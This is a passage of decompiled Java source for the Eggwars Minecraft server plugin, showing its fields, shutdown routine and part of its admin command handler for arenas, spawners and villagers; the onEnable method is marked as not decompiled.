package me.wazup.eggwars;

import com.google.common.collect.Lists;
import com.google.common.io.ByteArrayDataOutput;
import com.google.common.io.ByteStreams;
import java.awt.Image;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.invoke.ConstantCallSite;
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodType;
import java.lang.invoke.MethodHandles.Lookup;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLConnection;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.Collection;
import java.util.Collections;
import java.util.Comparator;
import java.util.HashMap;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import java.util.Random;
import java.util.Set;
import java.util.Map.Entry;
import javax.imageio.ImageIO;
import net.milkbowl.vault.economy.Economy;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Color;
import org.bukkit.FireworkEffect;
import org.bukkit.GameMode;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.SkullType;
import org.bukkit.Sound;
import org.bukkit.World;
import org.bukkit.WorldCreator;
import org.bukkit.FireworkEffect.Type;
import org.bukkit.World.Environment;
import org.bukkit.block.Block;
import org.bukkit.block.Sign;
import org.bukkit.block.Skull;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Firework;
import org.bukkit.entity.Player;
import org.bukkit.generator.ChunkGenerator;
import org.bukkit.generator.ChunkGenerator.BiomeGrid;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.InventoryHolder;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.FireworkMeta;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.inventory.meta.SkullMeta;
import org.bukkit.map.MapCanvas;
import org.bukkit.map.MapRenderer;
import org.bukkit.map.MapView;
import org.bukkit.map.MinecraftFont;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.scheduler.BukkitTask;
import org.bukkit.scoreboard.Team;

public class Eggwars extends JavaPlugin {
   Eggwars plugin;
   public static EggwarsAPI api;
   Random r = new Random();
   ChatColor[] colors;
   ArrayList players;
   ArrayList lobbyPlayers;
   ArrayList protectedPlayers;
   ArrayList parties;
   HashMap playerData;
   HashMap selectionMode;
   HashMap joinSigns;
   HashMap topSigns;
   HashMap arenas;
   HashMap kits;
   HashMap trails;
   ItemStack wand_itemstack;
   ItemStack pane_itemstack;
   ItemStack save_itemstack;
   ItemStack plus_itemstack;
   ItemStack minus_itemstack;
   ItemStack winnersMap;
   ItemStack quit_itemstack;
   ItemStack play_itemstack;
   ItemStack shop_itemstack;
   ItemStack profile_itemstack;
   ItemStack party_itemstack;
   ItemStack teleporter_itemstack;
   ItemStack autojoin_itemstack;
   ItemStack teamselector_itemstack;
   ItemStack vote_itemstack;
   ItemStack back_itemstack;
   ItemStack stats_itemstack;
   ItemStack inventory_itemstack;
   ItemStack achievements_itemstack;
   ItemStack confirm_itemstack;
   ItemStack cancel_itemstack;
   Inventory profileInventory;
   Inventory partyMenu;
   Inventory quitInventory;
   Inventory votingOptions;
   Inventory spectatorMenu;
   SmartInventory shop;
   SmartInventory arenaSelector;
   SmartInventory partySelector;
   SmartInventory playerInviter;
   int[] smartSlots;
   Location lobbyLocation;
   BukkitTask savingTask;
   BukkitTask leaderboard_updater;
   long leaderboard_updater_time;
   BukkitTask scoreboardTitleAnimationTask;
   Sound CLICK;
   Sound NOTE_PLING;
   Sound ENDERDRAGON_GROWL;
   Sound ITEM_PICKUP;
   Sound ENDERMAN_TELEPORT;
   boolean availableUpdate;
   FilesManager filesManager;
   Config config;
   RollbackManager rollbackManager;
   MySQL mysql;
   RanksManager ranksManager;
   AchievementsManager achievementsManager;
   Broadcaster broadcaster;
   MysteryBox mysteryBox;
   VillagerShop villagerShop;
   Customization customization;
   HologramsManager hologramsManager;
   Economy vault;
   static Method setDamageMethod;
   GameMode spectatorMode;
   public static boolean done;

   public Eggwars() {
      this.colors = new ChatColor[]{ChatColor.DARK_AQUA, ChatColor.GOLD, ChatColor.GRAY, ChatColor.BLUE, ChatColor.GREEN, ChatColor.AQUA, ChatColor.RED, ChatColor.LIGHT_PURPLE, ChatColor.YELLOW};
      this.players = new ArrayList();
      this.lobbyPlayers = new ArrayList();
      this.protectedPlayers = new ArrayList();
      this.playerData = new HashMap();
      this.selectionMode = new HashMap();
      this.smartSlots = new int[]{10, 11, 12, 13, 14, 15, 16, 19, 20, 21, 22, 23, 24, 25, 28, 29, 30, 31, 32, 33, 34, 37, 38, 39, 40, 41, 42, 43};
      this.leaderboard_updater_time = 0L;
   }

   public void onEnable() {
      // $FF: Couldn't be decompiled
   }

   public void onDisable() {
      ArrayList var1 = new ArrayList();
      Iterator var3 = this.arenas.values().iterator();

      while(var3.hasNext()) {
         Arena var2 = (Arena)var3.next();
         var1.addAll(this.getPlayers(var2.spectators));
      }

      var3 = this.getPlayers(this.players).iterator();

      Player var6;
      while(var3.hasNext()) {
         var6 = (Player)var3.next();
         ((PlayerData)this.playerData.get(var6.getName())).restoreData(var6);
         var6.sendMessage((String)this.customization.messages.get("Player-Leave"));
         Iterator var5 = var1.iterator();

         while(var5.hasNext()) {
            Player var4 = (Player)var5.next();
            var6.showPlayer(var4);
         }
      }

      var3 = this.getPlayers(this.playerData.keySet()).iterator();

      while(var3.hasNext()) {
         var6 = (Player)var3.next();
         ((PlayerData)this.playerData.get(var6.getName())).save(var6);
      }

      var3 = this.getPlayers(this.selectionMode.keySet()).iterator();

      while(var3.hasNext()) {
         var6 = (Player)var3.next();
         var6.getInventory().removeItem(new ItemStack[]{this.wand_itemstack});
      }

      if (this.hologramsManager != null && this.hologramsManager.leaderboardHologram != null) {
         this.hologramsManager.leaderboardHologram.delete();
      }

      Bukkit.getConsoleSender().sendMessage(this.customization.prefix + "Plugin has been disabled!");
   }

   public boolean onCommand(final CommandSender var1, Command var2, String var3, final String[] var4) {
      if (var3.equalsIgnoreCase("eggwars") || var3.equalsIgnoreCase("ew")) {
         if (var1 instanceof Player) {
            ((Player)var1).playSound(((Player)var1).getLocation(), this.CLICK, 1.0F, 1.0F);
         }

         if (var4.length == 0) {
            ChatColor var28 = this.colors[this.r.nextInt(this.colors.length)];
            var1.sendMessage("" + var28 + ChatColor.STRIKETHROUGH + "-------------" + ChatColor.YELLOW + " Eggwars " + ChatColor.GRAY + "[" + this.getDescription().getVersion() + "] " + var28 + ChatColor.STRIKETHROUGH + "-------------");
            var1.sendMessage(var28 + " - " + ChatColor.YELLOW + "/Eggwars | ew " + var28 + Enums.SPECIAL_CHARACTER.ARROW + ChatColor.GREEN + " Shows a list of commands");
            if (!this.config.bungee_mode_enabled) {
               var1.sendMessage(var28 + " - " + ChatColor.YELLOW + "/ew Join " + var28 + Enums.SPECIAL_CHARACTER.ARROW + ChatColor.GREEN + " Puts you in the game lobby");
            }

            var1.sendMessage(var28 + " - " + ChatColor.YELLOW + "/ew Leave " + var28 + Enums.SPECIAL_CHARACTER.ARROW + ChatColor.GREEN + " Removes you from the game!");
            var1.sendMessage(var28 + " - " + ChatColor.YELLOW + "/ew Autojoin " + var28 + Enums.SPECIAL_CHARACTER.ARROW + ChatColor.GREEN + " Puts you in the best available arena!");
            var1.sendMessage(var28 + " - " + ChatColor.YELLOW + "/ew List " + var28 + Enums.SPECIAL_CHARACTER.ARROW + ChatColor.GREEN + " Shows a list of arenas and other information!");
            var1.sendMessage(var28 + " - " + ChatColor.YELLOW + "/ew " + (var1.hasPermission("eggwars.admin") ? ChatColor.GREEN : ChatColor.RED) + "Admin " + var28 + Enums.SPECIAL_CHARACTER.ARROW + ChatColor.GREEN + " Shows a list of admin commands");
            var1.sendMessage("" + var28 + ChatColor.STRIKETHROUGH + "--------------------------------------");
            return true;
         } else {
            String var5 = var4[0].toLowerCase();
            ChatColor var30;
            int var52;
            if (var5.equals("admin")) {
               if (!this.checkSender(var1, false, "eggwars.admin")) {
                  return true;
               } else {
                  var30 = this.colors[this.r.nextInt(this.colors.length)];
                  var52 = var4.length > 1 && this.checkNumbers(var4[1]) ? Math.min(Math.max(Integer.valueOf(var4[1]), 1), 2) : 1;
                  var1.sendMessage("" + var30 + ChatColor.STRIKETHROUGH + "-------" + ChatColor.YELLOW + " Eggwars " + ChatColor.RED + "Admin" + ChatColor.GRAY + " [Page " + var52 + "] " + var30 + ChatColor.STRIKETHROUGH + "-------");
                  if (var52 == 1) {
                     var1.sendMessage(var30 + " - " + ChatColor.YELLOW + "/ew Setlobby " + var30 + Enums.SPECIAL_CHARACTER.ARROW + ChatColor.GREEN + " Sets the lobby location!");
                     var1.sendMessage(var30 + " - " + ChatColor.YELLOW + "/ew Wand " + var30 + Enums.SPECIAL_CHARACTER.ARROW + ChatColor.GREEN + " Gives you a selection wand!");
                     var1.sendMessage(var30 + " - " + ChatColor.YELLOW + "/ew Create " + var30 + Enums.SPECIAL_CHARACTER.ARROW + ChatColor.GREEN + " Creates a new arena!");
                     var1.sendMessage(var30 + " - " + ChatColor.YELLOW + "/ew Delete " + var30 + Enums.SPECIAL_CHARACTER.ARROW + ChatColor.GREEN + " Deletes an existing arena!");
                     var1.sendMessage(var30 + " - " + ChatColor.YELLOW + "/ew Setteamspawn " + var30 + Enums.SPECIAL_CHARACTER.ARROW + ChatColor.GREEN + " Sets a team spawn!");
                     var1.sendMessage(var30 + " - " + ChatColor.YELLOW + "/ew Removeteamspawn " + var30 + Enums.SPECIAL_CHARACTER.ARROW + ChatColor.GREEN + " Removes a team spawn!");
                     var1.sendMessage(var30 + " - " + ChatColor.YELLOW + "/ew Setteamegg " + var30 + Enums.SPECIAL_CHARACTER.ARROW + ChatColor.GREEN + " Sets a team egg!");
                     var1.sendMessage(var30 + " - " + ChatColor.YELLOW + "/ew Removeteamegg " + var30 + Enums.SPECIAL_CHARACTER.ARROW + ChatColor.GREEN + " Removes a team egg!");
                     var1.sendMessage(var30 + " - " + ChatColor.YELLOW + "/ew Addspawner " + var30 + Enums.SPECIAL_CHARACTER.ARROW + ChatColor.GREEN + " Adds a spawner to the arena!");
                     var1.sendMessage(var30 + " - " + ChatColor.YELLOW + "/ew Removespawner " + var30 + Enums.SPECIAL_CHARACTER.ARROW + ChatColor.GREEN + " Removes a spawner from the arena!");
                     var1.sendMessage(var30 + " - " + ChatColor.YELLOW + "/ew Addvillager " + var30 + Enums.SPECIAL_CHARACTER.ARROW + ChatColor.GREEN + " Adds a villager to the arena!");
                     var1.sendMessage(var30 + " - " + ChatColor.YELLOW + "/ew Removevillager " + var30 + Enums.SPECIAL_CHARACTER.ARROW + ChatColor.GREEN + " Removes a villager from the arena!");
                     var1.sendMessage(var30 + " - " + ChatColor.YELLOW + "/ew Setspectators " + var30 + Enums.SPECIAL_CHARACTER.ARROW + ChatColor.GREEN + " Sets the location that spectators teleport to");
                     var1.sendMessage(var30 + " - " + ChatColor.YELLOW + "/ew Updateregion " + var30 + Enums.SPECIAL_CHARACTER.ARROW + ChatColor.GREEN + " Updates an arena region!");
                     var1.sendMessage(var30 + " - " + ChatColor.YELLOW + "/ew WorldManager " + var30 + Enums.SPECIAL_CHARACTER.ARROW + ChatColor.GREEN + " Shows a list of World management commands!");
                  } else {
                     var1.sendMessage(var30 + " - " + ChatColor.YELLOW + "/ew Start/Stop " + var30 + Enums.SPECIAL_CHARACTER.ARROW + ChatColor.GREEN + " Forces an arena to start/stop!");
                     var1.sendMessage(var30 + " - " + ChatColor.YELLOW + "/ew Coins " + var30 + Enums.SPECIAL_CHARACTER.ARROW + ChatColor.GREEN + " Modifies a player coins!");
                     var1.sendMessage(var30 + " - " + ChatColor.YELLOW + "/ew Setmodifier " + var30 + Enums.SPECIAL_CHARACTER.ARROW + ChatColor.GREEN + " Changes a player modifier!");
                     var1.sendMessage(var30 + " - " + ChatColor.YELLOW + "/ew Holograms " + var30 + Enums.SPECIAL_CHARACTER.ARROW + ChatColor.GREEN + " Manages holographic features!");
                     var1.sendMessage(var30 + " - " + ChatColor.YELLOW + "/ew Reset " + var30 + Enums.SPECIAL_CHARACTER.ARROW + ChatColor.GREEN + " Resets a player stats!");
                     var1.sendMessage(var30 + " - " + ChatColor.YELLOW + "/ew Edit " + var30 + Enums.SPECIAL_CHARACTER.ARROW + ChatColor.GREEN + " Allows arena modifications!");
                     var1.sendMessage(var30 + " - " + ChatColor.YELLOW + "/ew Editmode " + var30 + Enums.SPECIAL_CHARACTER.ARROW + ChatColor.GREEN + " Allows the user to modify surroundings in bungeemode!");
                     var1.sendMessage(var30 + " - " + ChatColor.YELLOW + "/ew Reload " + var30 + Enums.SPECIAL_CHARACTER.ARROW + ChatColor.GREEN + " Reloads the plugin!");
                  }

                  var1.sendMessage("" + var30 + ChatColor.STRIKETHROUGH + "------------------------------------");
                  return true;
               }
            } else {
               final Player var6;
               if (!this.config.bungee_mode_enabled && var5.equals("join")) {
                  if (!this.checkSender(var1, true, "")) {
                     return true;
                  } else {
                     var6 = (Player)var1;
                     if (this.lobbyLocation == null) {
                        var6.sendMessage((String)this.customization.messages.get("Lobby-Not-Set"));
                        return true;
                     } else if (this.players.contains(var6.getName())) {
                        var6.sendMessage((String)this.customization.messages.get("Already-In-Game"));
                        return true;
                     } else {
                        this.join(var6);
                        return true;
                     }
                  }
               } else {
                  final Location var89;
                  final PlayerData var90;
                  if (var5.equals("leave")) {
                     if (!this.checkSender(var1, true, "")) {
                        return true;
                     } else {
                        var6 = (Player)var1;
                        if (!this.players.contains(var6.getName())) {
                           var6.sendMessage((String)this.customization.messages.get("Not-In-Game"));
                           return true;
                        } else {
                           var90 = (PlayerData)this.playerData.get(var6.getName());
                           if (var90.arena != null && !var90.arena.state.AVAILABLE() && !var90.arena.spectators.contains(var6.getName()) && !var90.arena.state.equals(Enums.ArenaState.ENDING)) {
                              var89 = var6.getLocation().getBlock().getLocation();
                              (new BukkitRunnable() {
                                 int seconds;

                                 {
                                    this.seconds = Eggwars.this.config.leaveCountdownSeconds;
                                 }

                                 public void run() {
                                    if (var90.arena != null && Bukkit.getPlayer(var6.getName()) != null) {
                                       if (!var6.getLocation().getBlock().getLocation().equals(var89)) {
                                          var6.sendMessage((String)Eggwars.this.customization.messages.get("Player-Move"));
                                          this.cancel();
                                       } else if (this.seconds == 0) {
                                          Eggwars.this.leave(var6, false);
                                          this.cancel();
                                       } else {
                                          var6.sendMessage(((String)Eggwars.this.customization.messages.get("Player-Movement-Disabled")).replace("%seconds%", String.valueOf(this.seconds)));
                                       }
                                    } else {
                                       this.cancel();
                                    }

                                    --this.seconds;
                                 }
                              }).runTaskTimer(this, 0L, 20L);
                           } else {
                              this.leave(var6, false);
                           }

                           return true;
                        }
                     }
                  } else if (var5.equals("autojoin")) {
                     if (!this.checkSender(var1, true, "")) {
                        return true;
                     } else {
                        var6 = (Player)var1;
                        var90 = (PlayerData)this.plugin.playerData.get(var6.getName());
                        if (var90.hasCooldown(var6, "AUTOJOIN_COMMAND", 3)) {
                           return true;
                        } else if (this.lobbyPlayers.contains(var6.getName()) && var90.arena == null) {
                           this.autojoin(var6, var4.length > 1 ? var4[1].toUpperCase() : "");
                           return true;
                        } else {
                           var6.sendMessage((String)this.customization.messages.get("Not-In-Lobby"));
                           return true;
                        }
                     }
                  } else {
                     String var7;
                     Arena var8;
                     File var40;
                     YamlConfiguration var47;
                     String var84;
                     if (var5.equals("setlobby")) {
                        if (!this.checkSender(var1, true, "eggwars.setlobby")) {
                           return true;
                        } else {
                           var6 = (Player)var1;
                           if (var4.length == 1) {
                              this.lobbyLocation = var6.getLocation();
                              this.getConfig().set("Lobby", this.getStringFromLocation(this.lobbyLocation, true));
                              this.saveConfig();
                              var6.sendMessage(this.customization.prefix + "Lobby has been " + ChatColor.GREEN + "successfully" + ChatColor.GRAY + " set at " + this.getReadableLocationString(this.lobbyLocation, true));
                           } else {
                              var7 = var4[1].toLowerCase();
                              if (!this.arenas.containsKey(var7)) {
                                 var6.sendMessage(this.customization.prefix + "Couldn't find an arena with that name!");
                                 return true;
                              }

                              var8 = (Arena)this.arenas.get(var7);
                              var40 = new File(this.getDataFolder() + "/arenas/" + var8.name, "locations.dat");
                              var47 = YamlConfiguration.loadConfiguration(var40);
                              var84 = this.getStringFromLocation(var6.getLocation(), true);
                              var47.set("Lobby", var84);

                              try {
                                 var47.save(var40);
                              } catch (IOException var17) {
                                 var17.printStackTrace();
                              }

                              var8.lobby = this.getLocationFromString(var84);
                              var6.sendMessage(this.customization.prefix + "Lobby has been " + ChatColor.GREEN + "successfully" + ChatColor.GRAY + " set for the arena " + ChatColor.GOLD + var8.name + ChatColor.GRAY + " at " + this.getReadableLocationString(var8.lobby, true));
                           }

                           return true;
                        }
                     } else if (var5.equals("wand")) {
                        if (!this.checkSender(var1, true, "eggwars.wand")) {
                           return true;
                        } else {
                           var6 = (Player)var1;
                           if (!this.selectionMode.containsKey(var6.getName())) {
                              var6.getInventory().addItem(new ItemStack[]{this.wand_itemstack});
                              this.selectionMode.put(var6.getName(), new Location[2]);
                              var6.sendMessage(this.customization.prefix + "You have entered the selection mode!");
                           } else {
                              var6.getInventory().removeItem(new ItemStack[]{this.wand_itemstack});
                              this.selectionMode.remove(var6.getName());
                              var6.sendMessage(this.customization.prefix + "You have left the selection mode!");
                           }

                           return true;
                        }
                     } else {
                        Cuboid var53;
                        if (var5.equals("create")) {
                           if (!this.checkSender(var1, true, "eggwars.create")) {
                              return true;
                           } else {
                              var6 = (Player)var1;
                              if (var4.length >= 4 && this.checkNumbers(var4[2], var4[3]) && Integer.valueOf(var4[2]) >= 1 && Integer.valueOf(var4[3]) >= 2) {
                                 var7 = var4[1];
                                 if (this.arenas.containsKey(var7.toLowerCase())) {
                                    var6.sendMessage(this.customization.prefix + "There is already an arena with that name!");
                                    return true;
                                 } else if (this.selectionMode.containsKey(var6.getName()) && ((Location[])this.selectionMode.get(var6.getName()))[0] != null && ((Location[])this.selectionMode.get(var6.getName()))[1] != null) {
                                    var53 = new Cuboid(((Location[])this.selectionMode.get(var6.getName()))[0], ((Location[])this.selectionMode.get(var6.getName()))[1]);
                                    if (var53.getSize() > this.config.maxArenaSize) {
                                       var6.sendMessage(this.customization.prefix + "Your current selection exceeds the max arena size set in the config! " + ChatColor.LIGHT_PURPLE + "(" + var53.getSize() + "/" + this.config.maxArenaSize + ")!");
                                       return true;
                                    } else {
                                       var6.sendMessage(this.customization.prefix + "Creating the arena " + ChatColor.AQUA + var7 + ChatColor.GRAY + "!");
                                       var40 = new File(this.getDataFolder() + "/arenas/" + var7, "settings.yml");
                                       var47 = YamlConfiguration.loadConfiguration(var40);
                                       var47.set("team-size", Integer.valueOf(var4[2]));
                                       var47.set("min-teams", Integer.valueOf(var4[3]));

                                       try {
                                          var47.save(var40);
                                       } catch (IOException var18) {
                                          var18.printStackTrace();
                                       }

                                       new ArenaSaveBlocksTask(this, var6, var7, var53);
                                       return true;
                                    }
                                 } else {
                                    var6.sendMessage(this.customization.prefix + "You haven't selected the 2 corners yet!");
                                    return true;
                                 }
                              } else {
                                 this.sendCommandUsage(var1, "Create", "<Name> <teamSize> <minTeams>", "Team size is the amount of players in each team, if you put 1 for example, the arena will be in Solo mode", "Min teams is the minimum amount of teams for the arena to start");
                                 return true;
                              }
                           }
                        } else {
                           final String var29;
                           Arena var31;
                           final File var39;
                           if (var5.equals("delete")) {
                              if (!this.checkSender(var1, false, "eggwars.delete")) {
                                 return true;
                              } else if (var4.length == 1) {
                                 this.sendCommandUsage(var1, "Delete", "<Name>");
                                 return true;
                              } else {
                                 var29 = var4[1].toLowerCase();
                                 if (!this.arenas.containsKey(var29)) {
                                    var1.sendMessage(this.customization.prefix + "Couldn't find an arena with that name!");
                                    return true;
                                 } else {
                                    var31 = (Arena)this.arenas.get(var29);
                                    var31.stop(false);
                                    var39 = new File(this.getDataFolder() + "/arenas/", var31.name);
                                    this.filesManager.deleteFile(var39);
                                    this.arenas.remove(var29);
                                    this.updateArenasInventory();
                                    var1.sendMessage(this.customization.prefix + "Arena has been deleted!");
                                    return true;
                                 }
                              }
                           } else if (var5.equals("list")) {
                              if (var1 instanceof Player && ((PlayerData)this.playerData.get(var1.getName())).hasCooldown((Player)var1, "LIST_COMMAND", 5)) {
                                 return true;
                              } else {
                                 var30 = this.colors[this.r.nextInt(this.colors.length)];
                                 var1.sendMessage("" + var30 + ChatColor.STRIKETHROUGH + "----------------" + ChatColor.YELLOW + " List " + var30 + ChatColor.STRIKETHROUGH + "----------------");
                                 var1.sendMessage(var30 + " - " + ChatColor.YELLOW + "Players: " + ChatColor.GREEN + this.players.size());
                                 var1.sendMessage(var30 + " - " + ChatColor.YELLOW + "Next leaderboard update: " + (this.leaderboard_updater == null ? ChatColor.RED + "Task is off" : ChatColor.GREEN + String.valueOf((this.leaderboard_updater_time - System.currentTimeMillis()) / 1000L) + ChatColor.AQUA + "s " + ChatColor.LIGHT_PURPLE + "(" + (this.leaderboard_updater_time - System.currentTimeMillis()) / 60000L + "m)"));
                                 var1.sendMessage(var30 + " - " + ChatColor.YELLOW + "Bukkit: " + ChatColor.GREEN + Bukkit.getBukkitVersion());
                                 var1.sendMessage(var30 + " - " + ChatColor.YELLOW + "Loaded arenas: " + ChatColor.GREEN + this.arenas.size());
                                 Iterator var91 = this.arenas.values().iterator();

                                 while(var91.hasNext()) {
                                    var31 = (Arena)var91.next();
                                    var1.sendMessage(var30 + " - " + ChatColor.YELLOW + var31.name + var30 + " | State: " + var31.state + var30 + " | Players: " + ChatColor.LIGHT_PURPLE + var31.players.size() + var30 + " | Teams setup: " + ChatColor.AQUA + var31.teams.size() + var30 + " | Team size: " + ChatColor.GOLD + var31.teamSize + var30 + " | Spawners: " + ChatColor.GRAY + var31.spawners.size() + var30 + " | Villagers: " + ChatColor.WHITE + var31.villagers.size() + var30 + " | Enabled: " + (var31.enabled ? ChatColor.GREEN + "true" : ChatColor.RED + "false"));
                                 }

                                 var1.sendMessage("" + var30 + ChatColor.STRIKETHROUGH + "-------------------------------------");
                                 return true;
                              }
                           } else if (!var5.equals("setteamspawn") && !var5.equals("setteamegg")) {
                              if (!var5.equals("removeteamspawn") && !var5.equals("removeteamegg")) {
                                 Iterator var43;
                                 int var59;
                                 Arena var67;
                                 if (var5.equals("addspawner")) {
                                    if (!this.checkSender(var1, true, "eggwars.addspawner")) {
                                       return true;
                                    } else if (var4.length >= 5 && this.checkNumbers(var4[3])) {
                                       var6 = (Player)var1;
                                       if (!this.arenas.containsKey(var4[1].toLowerCase())) {
                                          var6.sendMessage(this.customization.prefix + "Couldn't find an arena with that name!");
                                          return true;
                                       } else {
                                          Block var80 = null;
                                          var43 = var6.getLineOfSight((Set)null, 10).iterator();

                                          while(var43.hasNext()) {
                                             Block var88 = (Block)var43.next();
                                             var80 = var88;
                                             if (!var88.getType().equals(Material.AIR)) {
                                                break;
                                             }
                                          }

                                          if (var80.getType().equals(Material.AIR)) {
                                             var6.sendMessage(this.customization.prefix + "You must look at a block to mark it as a spawner!");
                                             return true;
                                          } else {
                                             var89 = var80.getLocation();
                                             if (Material.getMaterial(var4[2].toUpperCase()) == null) {
                                                var6.sendMessage(this.customization.prefix + "Couldn't find a material with that name! you have to use Material enums.");
                                                return true;
                                             } else if (Integer.valueOf(var4[3]) % 10 == 0 && Integer.valueOf(var4[3]) >= 10) {
                                                if (!var4[4].equalsIgnoreCase("true") && !var4[4].equalsIgnoreCase("false")) {
                                                   var6.sendMessage(this.customization.prefix + "The last argument must be either true or false. If it is true, that means the generator is broken and requires an upgrade to work");
                                                   return true;
                                                } else {
                                                   var67 = (Arena)this.arenas.get(var4[1].toLowerCase());
                                                   Material var87 = Material.getMaterial(var4[2].toUpperCase());
                                                   var59 = Integer.valueOf(var4[3]);
                                                   boolean var75 = Boolean.valueOf(var4[4]);
                                                   File var79 = new File(this.getDataFolder() + "/arenas/" + var67.name, "locations.dat");
                                                   YamlConfiguration var82 = YamlConfiguration.loadConfiguration(var79);
                                                   int var85 = 1;
                                                   if (var82.getConfigurationSection("Spawners." + var87.name()) != null && !var82.getConfigurationSection("Spawners." + var87.name()).getKeys(false).isEmpty()) {
                                                      var85 = var82.getConfigurationSection("Spawners." + var87.name()).getKeys(false).size() + 1;
                                                   }

                                                   var82.set("Spawners." + var87.name() + "." + var85, var59 + " : " + var75 + " : " + this.getStringFromLocation(var89, true));

                                                   try {
                                                      var82.save(var79);
                                                   } catch (IOException var19) {
                                                      var19.printStackTrace();
                                                   }

                                                   var67.spawners.add(new Spawner(this, var89.add(0.5D, 1.0D, 0.5D), var87, var59, var75));
                                                   var6.sendMessage(this.customization.prefix + "You have added a " + ChatColor.AQUA + var87.name() + ChatColor.GRAY + " spawner in the arena " + ChatColor.YELLOW + var67.name + ChatColor.GRAY + " with the speed of " + ChatColor.LIGHT_PURPLE + var59 + ChatColor.GRAY + " in ticks at the location " + ChatColor.BLUE + this.getReadableLocationString(var89, true));
                                                   return true;
                                                }
                                             } else {
                                                var6.sendMessage(this.customization.prefix + "The speed must be 10 multiplied by a number (10, 20, 30...)");
                                                return true;
                                             }
                                          }
                                       }
                                    } else {
                                       this.sendCommandUsage(var1, "Addspawner", "<Arena> <Material> <Speed in ticks> <Broken>");
                                       return true;
                                    }
                                 } else {
                                    int var51;
                                    YamlConfiguration var86;
                                    if (var5.equals("removespawner")) {
                                       if (!this.checkSender(var1, false, "eggwars.removespawner")) {
                                          return true;
                                       } else if (var4.length < 3) {
                                          this.sendCommandUsage(var1, "Removespawner", "<Arena> <Material>");
                                          return true;
                                       } else if (!this.arenas.containsKey(var4[1].toLowerCase())) {
                                          var1.sendMessage(this.customization.prefix + "Couldn't find an arena with that name!");
                                          return true;
                                       } else if (Material.getMaterial(var4[2].toUpperCase()) == null) {
                                          var1.sendMessage(this.customization.prefix + "Couldn't find a material with that name! you have to use Material enums.");
                                          return true;
                                       } else {
                                          Arena var62 = (Arena)this.arenas.get(var4[1].toLowerCase());
                                          Material var77 = Material.getMaterial(var4[2].toUpperCase());
                                          var39 = new File(this.getDataFolder() + "/arenas/" + var62.name, "locations.dat");
                                          var86 = YamlConfiguration.loadConfiguration(var39);
                                          if (!var62.spawners.isEmpty() && var86.getConfigurationSection("Spawners." + var77.name()) != null && !var86.getConfigurationSection("Spawners." + var77.name()).getKeys(false).isEmpty()) {
                                             var51 = var86.getConfigurationSection("Spawners." + var77.name()).getKeys(false).size();
                                             var84 = var86.getString("Spawners." + var77.name() + "." + var51);
                                             Location var69 = this.getLocationFromString(var84.split(" : ")[2]);
                                             boolean var73 = Boolean.valueOf(var84.split(" : ")[1]);
                                             int var78 = Integer.valueOf(var84.split(" : ")[0]);
                                             var78 = var78 % 10 == 0 && var78 >= 10 ? var78 : 10;
                                             Spawner var15 = new Spawner(this, var69, var77, var78, var73);
                                             var86.set("Spawners." + var77.name() + "." + var51, (Object)null);

                                             try {
                                                var86.save(var39);
                                             } catch (IOException var20) {
                                                var20.printStackTrace();
                                             }

                                             var62.spawners.remove(var15);
                                             var1.sendMessage(this.customization.prefix + "You have " + ChatColor.GREEN + "successfully" + ChatColor.GRAY + " removed the spawner of the material " + ChatColor.LIGHT_PURPLE + var77.name() + ChatColor.GRAY + " with the id of " + ChatColor.AQUA + "#" + var51 + ChatColor.GRAY + " from the arena " + ChatColor.YELLOW + var62.name);
                                             return true;
                                          } else {
                                             var1.sendMessage(this.customization.prefix + "The arena doesn't have a spawner for that material!");
                                             return true;
                                          }
                                       }
                                    } else if (var5.equals("addvillager")) {
                                       if (!this.checkSender(var1, true, "eggwars.addvillager")) {
                                          return true;
                                       } else if (var4.length < 2) {
                                          this.sendCommandUsage(var1, "Addvillager", "<Arena>");
                                          return true;
                                       } else {
                                          var6 = (Player)var1;
                                          var7 = var4[1].toLowerCase();
                                          if (!this.arenas.containsKey(var7)) {
                                             var6.sendMessage(this.customization.prefix + "Couldn't find an arena with that name!");
                                             return true;
                                          } else {
                                             var8 = (Arena)this.arenas.get(var7);
                                             var40 = new File(this.getDataFolder() + "/arenas/" + var8.name, "locations.dat");
                                             var47 = YamlConfiguration.loadConfiguration(var40);
                                             var59 = 1;
                                             if (var47.getConfigurationSection("Villagers") != null && !var47.getConfigurationSection("Villagers").getKeys(false).isEmpty()) {
                                                var59 = var47.getConfigurationSection("Villagers").getKeys(false).size() + 1;
                                             }

                                             var47.set("Villagers." + var59, this.getStringFromLocation(var6.getLocation(), true));

                                             try {
                                                var47.save(var40);
                                             } catch (IOException var21) {
                                                var21.printStackTrace();
                                             }

                                             var8.villagers.add(var6.getLocation().getBlock().getLocation().add(0.5D, 1.0D, 0.5D));
                                             var6.sendMessage(this.customization.prefix + "You have " + ChatColor.GREEN + "successfully" + ChatColor.GRAY + " added a villager with the id of " + ChatColor.AQUA + "#" + var59 + ChatColor.GRAY + " to the arena " + ChatColor.LIGHT_PURPLE + var8.name + ChatColor.GRAY + "!");
                                             return true;
                                          }
                                       }
                                    } else if (var5.equals("removevillager")) {
                                       if (!this.checkSender(var1, false, "eggwars.removevillager")) {
                                          return true;
                                       } else if (var4.length < 2) {
                                          this.sendCommandUsage(var1, "Removevillager", "<Arena>");
                                          return true;
                                       } else {
                                          var29 = var4[1].toLowerCase();
                                          if (!this.arenas.containsKey(var29)) {
                                             var1.sendMessage(this.customization.prefix + "Couldn't find an arena with that name!");
                                             return true;
                                          } else {
                                             var31 = (Arena)this.arenas.get(var29);
